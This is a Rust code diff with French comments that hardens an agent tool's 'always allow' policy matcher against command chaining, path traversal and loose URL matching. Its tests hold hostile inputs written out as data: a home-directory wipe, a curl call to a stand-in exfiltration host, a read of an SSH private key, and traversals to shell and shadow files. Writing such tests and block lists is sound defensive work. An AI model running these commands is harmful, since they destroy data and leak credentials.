@@ -105,17 +105,25 @@ impl PolicyRule {
 
 /// Correspondance de motif : toutes les clés du motif doivent être présentes et égales.
 ///
-/// Un motif `{"$prefix": "cargo test"}` accepte toute chaîne qui commence ainsi : c'est ce
-/// qui borne un « toujours » à une famille de commandes ou à un répertoire, au lieu de
-/// l'outil entier (issue #67).
+/// Trois opérateurs bornent un « toujours » au contexte de l'appel (issue #67), chacun
+/// écrit pour ne pas se contourner :
+///
+/// - [`CMD_PREFIX_OP`] : famille de commandes, **sans** enchaînement (`;`, `&&`, `|`,
+///   `$(…)`, redirection, retour à la ligne), et à la frontière d'un mot ;
+/// - [`PATH_PREFIX_OP`] : répertoire, comparé sur le chemin normalisé (`..` résolu) ;
+/// - [`ORIGIN_OP`] : schéma et hôte **exacts** d'une URL, jamais un préfixe de texte.
 fn args_match(pattern: &Value, args: &Value) -> bool {
     if let Value::Object(p) = pattern
         && p.len() == 1
-        && let Some(Value::String(prefix)) = p.get(PREFIX_OP)
+        && let Some((op, Value::String(expected))) = p.iter().next()
     {
-        return args
-            .as_str()
-            .is_some_and(|v| v.starts_with(prefix.as_str()));
+        let candidate = args.as_str().unwrap_or_default();
+        match op.as_str() {
+            CMD_PREFIX_OP => return command_matches(expected, candidate),
+            PATH_PREFIX_OP => return path_matches(expected, candidate),
+            ORIGIN_OP => return origin_of(candidate).as_deref() == Some(expected.as_str()),
+            _ => {}
+        }
     }
     match (pattern, args) {
         (Value::Object(p), Value::Object(a)) => p.iter().all(|(k, v)| match a.get(k) {
@@ -126,18 +134,86 @@ fn args_match(pattern: &Value, args: &Value) -> bool {
     }
 }
 
-/// Opérateur de préfixe d'un motif d'arguments (issue #67).
-pub const PREFIX_OP: &str = "$prefix";
+/// Famille de commandes (`cargo test`).
+pub const CMD_PREFIX_OP: &str = "$cmd_prefix";
+/// Répertoire (`src/`), comparé sur le chemin normalisé.
+pub const PATH_PREFIX_OP: &str = "$path_prefix";
+/// Origine d'une URL (`https://example.com`).
+pub const ORIGIN_OP: &str = "$origin";
 
-/// Motif rendu lisible pour une carte ou `/policies` : `command commence par « cargo test »`.
+/// Caractères qui enchaînent ou détournent une commande : une règle « toujours » sur
+/// `cargo test` ne doit pas couvrir `cargo test; rm -rf ~`.
+const CHAINING: &[char] = &[';', '&', '|', '`', '$', '>', '<', '\n', '\r', '(', ')'];
+
+fn command_matches(prefix: &str, candidate: &str) -> bool {
+    if candidate.contains(CHAINING) {
+        return false;
+    }
+    let Some(rest) = candidate.strip_prefix(prefix) else {
+        return false;
+    };
+    // La suite commence à une frontière de mot : `cargo testament` ne passe pas pour
+    // `cargo test`.
+    rest.is_empty() || rest.starts_with(char::is_whitespace)
+}
+
+fn path_matches(prefix: &str, candidate: &str) -> bool {
+    // `src/../../etc/passwd` commence textuellement par `src/` : la comparaison se fait
+    // sur le chemin normalisé, jamais sur le texte brut.
+    let norm = normalise_text(candidate);
+    let want = normalise_text(prefix);
+    if want.is_empty() {
+        return !norm.contains('/');
+    }
+    norm.starts_with(&want)
+}
+
+/// Résout `.` et `..` textuellement, sans toucher au disque.
+fn normalise_text(p: &str) -> String {
+    let absolute = p.starts_with('/');
+    let mut out: Vec<&str> = Vec::new();
+    for part in p.split('/') {
+        match part {
+            "" | "." => {}
+            ".." => {
+                out.pop();
+            }
+            other => out.push(other),
+        }
+    }
+    let joined = out.join("/");
+    let trailing = if p.ends_with('/') && !joined.is_empty() {
+        "/"
+    } else {
+        ""
+    };
+    format!("{}{joined}{trailing}", if absolute { "/" } else { "" })
+}
+
+/// Schéma et hôte d'une URL : `https://example.com/a` donne `https://example.com`.
+fn origin_of(url: &str) -> Option<String> {
+    let (scheme, rest) = url.split_once("://")?;
+    let host = rest.split(['/', '?', '#']).next().unwrap_or_default();
+    (!host.is_empty()).then(|| format!("{}://{}", scheme.to_lowercase(), host.to_lowercase()))
+}
+
+/// Motif rendu lisible pour une carte ou `/policies`.
 pub fn describe_pattern(pattern: &Value) -> String {
     let Some(obj) = pattern.as_object() else {
         return pattern.to_string();
     };
     obj.iter()
-        .map(|(k, v)| match v.get(PREFIX_OP).and_then(|p| p.as_str()) {
-            Some(prefix) => format!("{k} commence par « {prefix} »"),
-            None => format!(
+        .map(|(k, v)| match v.as_object().and_then(|o| o.iter().next()) {
+            Some((op, val)) if op == CMD_PREFIX_OP => {
+                format!("{k} : famille « {} »", val.as_str().unwrap_or_default())
+            }
+            Some((op, val)) if op == PATH_PREFIX_OP => {
+                format!("{k} sous « {} »", val.as_str().unwrap_or_default())
+            }
+            Some((op, val)) if op == ORIGIN_OP => {
+                format!("{k} sur « {} »", val.as_str().unwrap_or_default())
+            }
+            _ => format!(
                 "{k} = {}",
                 v.as_str().map(String::from).unwrap_or(v.to_string())
             ),
@@ -381,6 +457,43 @@ fn row_to_rule(
 
 #[cfg(test)]
 mod tests {
+
+    /// #67 (revue de sécurité) : les trois opérateurs de motif ne se contournent pas.
+    #[test]
+    fn pattern_operators_cannot_be_tricked() {
+        // Commandes : enchaînement, substitution, redirection, mot plus long.
+        assert!(command_matches(
+            "cargo test",
+            "cargo test -p penelope-kernel"
+        ));
+        assert!(command_matches("cargo test", "cargo test"));
+        for detour in [
+            "cargo test; rm -rf ~",
+            "cargo test && curl https://exfil.example",
+            "cargo test | tee /tmp/x",
+            "cargo test `cat ~/.ssh/id_ed25519`",
+            "cargo test $(whoami)",
+            "cargo test > /tmp/vol",
+            "cargo test\nrm -rf ~",
+            "cargo testament",
+            "cargotest",
+        ] {
+            assert!(!command_matches("cargo test", detour), "{detour}");
+        }
+
+        // Chemins : `..` résolu avant comparaison.
+        assert!(path_matches("src/", "src/b.rs"));
+        assert!(path_matches("src/", "./src/sous/c.rs"));
+        assert!(!path_matches("src/", "src/../../.zshrc"));
+        assert!(!path_matches("src/", "autre/b.rs"));
+        assert!(path_matches("/etc/app/", "/etc/app/conf"));
+        assert!(!path_matches("/etc/app/", "/etc/app/../shadow"));
+
+        // Origine : hôte exact, casse ignorée.
+        assert!(origin_of("https://example.com/a?b=1").as_deref() == Some("https://example.com"));
+        assert!(origin_of("HTTPS://Example.COM/a").as_deref() == Some("https://example.com"));
+        assert!(origin_of("pas-une-url").is_none());
+    }
     use super::*;
     use penelope_kernel::clock::TestClock;
     use penelope_kernel::config::McpPolicy;
